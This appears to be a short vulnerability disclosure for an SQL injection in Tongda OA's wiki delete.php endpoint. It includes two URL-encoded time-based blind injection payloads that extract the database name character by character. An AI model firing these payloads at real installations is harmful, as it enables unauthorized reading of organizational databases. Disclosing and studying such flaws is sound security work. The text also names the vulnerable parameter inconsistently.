SQL injection vulnerability exists in Tongda OA

verison:Tongda<=v11.10、=v2017 version

route:general/wiki/cp/manage/delete.php

There is an injected parameter: $TERM_ID_STR

The code here is very concise. When $PROJ_ID_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since it is closed with commas, there is a bypass.

![image](https://github.com/willchen0011/cve/assets/13689053/e8a21381-caa5-43bc-9d4e-a0809c5263bc)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/willchen0011/cve/assets/13689053/19be210e-0cbe-46b4-95f7-f4e8ff3c88fe)

Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time
POC
```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/willchen0011/cve/assets/13689053/0dfb434d-da21-4dfe-b41c-376501a9338d)

Get the database name by analogy:td_oa
